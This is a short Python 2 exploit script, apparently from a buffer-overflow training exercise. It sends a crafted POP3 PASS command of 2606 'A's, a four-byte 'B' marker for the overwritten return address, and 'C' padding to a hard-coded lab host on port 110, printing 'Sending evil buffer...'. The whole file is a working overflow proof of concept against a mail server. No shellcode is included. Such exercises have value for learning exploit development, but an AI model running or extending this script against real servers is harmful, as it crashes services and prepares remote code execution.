#!/usr/bin/python

#Imports
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# buffer = A's x 2602 + 4 B's + (Total Crash Value - B's - offset (2700 - 4 - 2606 = 90) x C's)  
# Therefore "2606 + 4 + 90 = 2700"

buffer = "\x41" * 2606 + "\x42\x42\x42\x42" + (2700 - 4 - 2606) * "\x43"

try:
    print "\n Sending evil buffer..."
    s.connect(('192.168.0.50',110))
    data = s.recv(1024)
    s.send('USER test'+'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    s.close()
    print "\ Done."
except:
    print "Could not connect to POP3!"

    
